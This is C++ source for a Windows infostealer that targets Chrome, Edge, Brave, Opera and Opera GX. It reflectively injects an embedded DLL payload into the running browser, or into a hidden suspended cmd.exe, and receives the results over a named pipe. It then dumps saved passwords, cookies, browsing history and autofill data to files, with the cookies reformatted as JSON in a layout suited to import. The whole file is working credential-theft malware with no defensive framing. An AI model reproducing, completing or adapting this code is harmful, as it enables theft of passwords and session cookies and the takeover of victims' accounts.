#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <algorithm>
#include <fstream>
#include <filesystem>
#include <ctime>
#include <iomanip>
#include <sstream>
#include <cctype>
#include <cwctype>
#include "bootstrapper.h"
#include "json.hpp"

using json = nlohmann::json;
namespace fs = std::filesystem;

// --- BURAYA BASE64 ENCODED DLL VERİSİNİ YAPIŞTIRIN ---

...1 lines omitted for brevity...


static const std::string base64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
    int in_len = (int)encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::vector<unsigned char> ret;

    while (in_len-- && (encoded_string[in_] != '=') && (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/'))) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++)
                char_array_4[i] = (unsigned char)base64_chars.find(char_array_4[i]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; (i < 3); i++)
                ret.push_back(char_array_3[i]);
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++)
            char_array_4[j] = 0;

        for (j = 0; j < 4; j++)
            char_array_4[j] = (unsigned char)base64_chars.find(char_array_4[j]);

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
    }

    return ret;
}

std::wstring expand_path(const std::wstring& path) {
    wchar_t buffer[MAX_PATH];
    ExpandEnvironmentStringsW(path.c_str(), buffer, MAX_PATH);
    return std::wstring(buffer);
}

std::wstring get_process_path(DWORD pid) {
    wchar_t path[MAX_PATH];
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (h) {
        DWORD size = MAX_PATH;
        if (QueryFullProcessImageNameW(h, 0, path, &size)) {
            CloseHandle(h);
            return std::wstring(path);
        }
        CloseHandle(h);
    }
    return L"";
}

struct BrowserConfig {
    std::wstring name;
    std::wstring exe_name;
    std::vector<std::wstring> common_paths;
};

const std::vector<BrowserConfig> BROWSERS = {
    {L"Chrome", L"chrome.exe", {L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", L"%LocalAppData%\\Google\\Chrome\\Application\\chrome.exe"}},
    {L"Edge", L"msedge.exe", {L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe", L"%LocalAppData%\\Microsoft\\Edge\\Application\\msedge.exe"}},
    {L"Brave", L"brave.exe", {L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"%LocalAppData%\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}},
    {L"Opera", L"opera.exe", {L"C:\\Program Files\\Opera\\opera.exe", L"C:\\Program Files (x86)\\Opera\\opera.exe", L"%LocalAppData%\\Programs\\Opera\\opera.exe", L"%AppData%\\Local\\Programs\\Opera\\opera.exe"}},
    {L"OperaGX", L"opera.exe", {L"C:\\Program Files\\Opera GX\\opera.exe", L"C:\\Program Files (x86)\\Opera GX\\opera.exe", L"%LocalAppData%\\Programs\\Opera GX\\opera.exe", L"%AppData%\\Local\\Programs\\Opera GX\\opera.exe"}}
};

std::wstring find_browser_exe(const BrowserConfig& browser) {
    for (const auto& path_raw : browser.common_paths) {
        std::wstring path = expand_path(path_raw);
        if (fs::exists(path)) return path;
    }
    return L"";
}

DWORD find_main_process(const BrowserConfig& browser) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);

    std::wstring target_exe = browser.exe_name;
    std::transform(target_exe.begin(), target_exe.end(), target_exe.begin(), ::towlower);

    DWORD main_pid = 0;
    if (Process32FirstW(snapshot, &entry)) {
        do {
            std::wstring current_exe = entry.szExeFile;
            std::transform(current_exe.begin(), current_exe.end(), current_exe.begin(), ::towlower);

            if (current_exe == target_exe) {
                // Verify by full path to avoid Opera/OperaGX confusion
                std::wstring full_path = get_process_path(entry.th32ProcessID);
                std::transform(full_path.begin(), full_path.end(), full_path.begin(), ::towlower);

                std::wstring target_name = browser.name;
                std::transform(target_name.begin(), target_name.end(), target_name.begin(), ::towlower);

                if (full_path.find(target_name) != std::wstring::npos) {
                    main_pid = entry.th32ProcessID;
                    break;
                }
            }
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return main_pid;
}

void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& dll_bytes) {
    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)dll_bytes.data();
    IMAGE_NT_HEADERS64* nt_headers = (IMAGE_NT_HEADERS64*)(dll_bytes.data() + dos_header->e_lfanew);

    size_t image_size = nt_headers->OptionalHeader.SizeOfImage;
    void* preferred_base = (void*)nt_headers->OptionalHeader.ImageBase;

    void* remote_base = VirtualAllocEx(h_process, preferred_base, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    bool relocation_required = false;

    if (!remote_base) {
        relocation_required = true;
        remote_base = VirtualAllocEx(h_process, NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!remote_base) return;

    WriteProcessMemory(h_process, remote_base, dll_bytes.data(), nt_headers->OptionalHeader.SizeOfHeaders, NULL);

    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)((size_t)nt_headers + sizeof(IMAGE_NT_HEADERS64));
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        if (sections[i].PointerToRawData == 0 || sections[i].SizeOfRawData == 0) continue;
        void* remote_section = (void*)((size_t)remote_base + sections[i].VirtualAddress);
        void* local_section = (void*)(dll_bytes.data() + sections[i].PointerToRawData);
        WriteProcessMemory(h_process, remote_section, local_section, sections[i].SizeOfRawData, NULL);
    }

    HMODULE h_kernel32 = GetModuleHandleA("kernel32.dll");
    DllInfo dll_info = {
        remote_base,
        (LoadLibraryA_t)GetProcAddress(h_kernel32, "LoadLibraryA"),
        (GetProcAddress_t)GetProcAddress(h_kernel32, "GetProcAddress"),
        relocation_required
    };

    size_t bootstrapper_size = (size_t)realign_pe_end - (size_t)realign_pe;
    if (bootstrapper_size == 0) bootstrapper_size = 4096;

    size_t total_size = sizeof(DllInfo) + bootstrapper_size;
    void* remote_bootstrap = VirtualAllocEx(h_process, NULL, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(h_process, remote_bootstrap, &dll_info, sizeof(DllInfo), NULL);
    void* remote_code = (void*)((size_t)remote_bootstrap + sizeof(DllInfo));
    WriteProcessMemory(h_process, remote_code, (void*)realign_pe, bootstrapper_size, NULL);

    HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)remote_code, remote_bootstrap, 0, NULL);
    if (h_thread) {
        WaitForSingleObject(h_thread, INFINITE);
        CloseHandle(h_thread);
    }
}

void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const BrowserConfig& browser) {
    std::wcout << L"\n--- Processing Browser: " << browser.name << L" ---" << std::endl;

    DWORD target_pid = find_main_process(browser);
    HANDLE h_process = NULL;
    bool process_started_by_us = false;
    PROCESS_INFORMATION pi = { 0 };

    if (target_pid != 0) {
        std::wcout << L"Found existing " << browser.name << L" process (PID: " << target_pid << L"). Injecting..." << std::endl;
        h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    }

    if (!h_process) {
        // Surrogate strategy: If browser not running, use cmd.exe as host.
        // This is safe because Opera/GX only needs DPAPI which is per-user session.
        std::wcout << L"Browser not running. Using surrogate host for extraction..." << std::endl;
        std::wstring cmd_exe = expand_path(L"%SystemRoot%\\System32\\cmd.exe");

        std::vector<wchar_t> cmd_buf(cmd_exe.begin(), cmd_exe.end());
        cmd_buf.push_back(0);

        STARTUPINFOW si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        SetEnvironmentVariableW(L"EXTRACTION_TARGET", browser.name.c_str());

        if (CreateProcessW(NULL, cmd_buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            h_process = pi.hProcess;
            process_started_by_us = true;
        } else {
            std::wcerr << L"Failed to create surrogate process for " << browser.name << std::endl;
            return;
        }
    }

    HANDLE h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 50 * 1024 * 1024, 50 * 1024 * 1024, 0, NULL);

    inject_dll_reflective(h_process, dll_bytes);
    if (process_started_by_us) ResumeThread(pi.hThread);

    if (h_pipe != INVALID_HANDLE_VALUE) {
        if (ConnectNamedPipe(h_pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
            std::vector<char> buffer;
            char temp[65536];
            DWORD bytes_read;
            while (ReadFile(h_pipe, temp, sizeof(temp), &bytes_read, NULL) && bytes_read > 0) {
                buffer.insert(buffer.end(), temp, temp + bytes_read);
            }

            if (!buffer.empty()) {
                try {
                    auto profiles = json::parse(buffer);
                    fs::path browser_dir(browser.name);
                    fs::create_directories(browser_dir);

                    for (size_t i = 0; i < profiles.size(); ++i) {
                        std::string p_name = profiles[i]["name"].get<std::string>();
                        std::replace(p_name.begin(), p_name.end(), '/', '_');
                        std::replace(p_name.begin(), p_name.end(), '\\', '_');
                        std::replace(p_name.begin(), p_name.end(), ':', '_');

                        fs::path profile_dir = browser_dir / p_name;
                        fs::create_directories(profile_dir);

                        // Passwords
                        std::string p_pass = (profile_dir / "passwords.txt").string();
                        std::ofstream pass_file(p_pass);
                        for (auto& p : profiles[i]["passwords"]) {
                            pass_file << "URL: " << p["url"].get<std::string>() << "\nUser: " << p["username"].get<std::string>() << "\nPass: " << p["password"].get<std::string>() << "\n\n";
                        }
                        pass_file.close();

                        // Cookies
                        std::string p_cook = (profile_dir / "cookies.txt").string();
                        std::ofstream cookie_file(p_cook);
                        json cookie_json_list = json::array();
                        for (auto& c : profiles[i]["cookies"]) {
                            std::string host = c["host"].get<std::string>();
                            std::string name = c["name"].get<std::string>();
                            std::string val = c["value"].get<std::string>();
                            std::string path = c["path"].get<std::string>();
                            long long exp_utc = c["expires_utc"].get<long long>();
                            int secure = c["is_secure"].get<int>();
                            int httponly = c["is_httponly"].get<int>();
                            int samesite = c["samesite"].get<int>();

                            cookie_file << "Host: " << host << " | Name: " << name << " | Value: " << val << "\n";

                            json cj;
                            std::string host_raw = host;
                            if (host_raw.find("http") != 0) {
                                if (host_raw[0] == '.') host_raw = "https://" + host_raw;
                                else host_raw = "https://" + host_raw;
                            }
                            if (host_raw.back() != '/') host_raw += "/";

                            cj["Host raw"] = host_raw;
                            cj["Name raw"] = name;
                            cj["Path raw"] = path;
                            cj["Content raw"] = val;

                            long long unix_ts = (exp_utc / 1000000) - 11644473600LL;
                            std::time_t t = (std::time_t)unix_ts;
                            struct tm *tm_ptr = std::gmtime(&t);
                            std::string date_str = "";
                            if (tm_ptr) {
                                std::ostringstream oss;
                                oss << std::put_time(tm_ptr, "%d-%m-%Y %H:%M:%S");
                                date_str = oss.str();
                            }

                            cj["Expires"] = date_str;
                            cj["Expires raw"] = std::to_string(unix_ts);
                            cj["Send for"] = secure ? "Encrypted connections only" : "Any type of connection";
                            cj["Send for raw"] = secure ? "true" : "false";
                            cj["HTTP only raw"] = httponly ? "true" : "false";

                            std::string ss_str = "no_restriction";
                            if (samesite == 1) ss_str = "lax";
                            else if (samesite == 2) ss_str = "strict";
                            cj["SameSite raw"] = ss_str;

                            cj["This domain only"] = (host[0] == '.') ? "Valid for subdomains" : "Valid for host only";
                            cj["This domain only raw"] = (host[0] == '.') ? "false" : "true";
                            cj["First Party Domain"] = "";

                            cookie_json_list.push_back(cj);
                        }
                        cookie_file.close();

                        std::ofstream(profile_dir / "cookies.json") << cookie_json_list.dump(4);
                        std::ofstream(profile_dir / "passwords.json") << profiles[i]["passwords"].dump(4);
                        std::ofstream(profile_dir / "history.json") << profiles[i]["history"].dump(4);
                        std::ofstream(profile_dir / "autofill.json") << profiles[i]["autofill"].dump(4);

                        // History
                        std::string p_hist = (profile_dir / "history.txt").string();
                        std::ofstream hist_file(p_hist);
                        for (auto& h : profiles[i]["history"]) {
                            hist_file << "URL: " << h["url"].get<std::string>() << " | Title: " << h["title"].get<std::string>() << " | Visits: " << h["visit_count"].get<int>() << "\n";
                        }
                        hist_file.close();

                        // Autofill
                        std::string p_auto = (profile_dir / "autofill.txt").string();
                        std::ofstream auto_file(p_auto);
                        for (auto& a : profiles[i]["autofill"]) {
                            auto_file << "Name: " << a["name"].get<std::string>() << " | Value: " << a["value"].get<std::string>() << "\n";
                        }
                        auto_file.close();

                        std::cout << "[+] Saved " << profiles[i]["passwords"].size() << " passwords to: " << p_pass << std::endl;
                        std::cout << "[+] Saved " << profiles[i]["cookies"].size() << " cookies to: " << p_cook << std::endl;
                    }
                } catch (...) {
                    std::cerr << "Error parsing received JSON data." << std::endl;
                }
            }
        }
        CloseHandle(h_pipe);
    }

    Sleep(1000);
    if (process_started_by_us) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        CloseHandle(h_process);
    }
}

int main(int argc, char* argv[]) {
    std::string browser_choice = "all";
    if (argc > 1) {
        std::string arg1 = argv[1];
        if (arg1 == "-b" || arg1 == "--browser") {
            if (argc > 2) browser_choice = argv[2];
        }
    }

    std::vector<unsigned char> dll_bytes;
    if (!EMBEDDED_DLL_BASE64.empty()) {
        dll_bytes = base64_decode(EMBEDDED_DLL_BASE64);
    } else {
        std::ifstream file("payload.dll", std::ios::binary);
        if (file) {
            dll_bytes = std::vector<unsigned char>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        }
    }

    if (dll_bytes.empty()) {
        std::cerr << "DLL not found." << std::endl;
        return 1;
    }

    for (const auto& config : BROWSERS) {
        std::string name_lower(config.name.begin(), config.name.end());
        std::transform(name_lower.begin(), name_lower.end(), name_lower.begin(), ::tolower);
        if (browser_choice == "all" || browser_choice == name_lower) {
            inject_and_collect(dll_bytes, config);
        }
    }

    return 0;
}
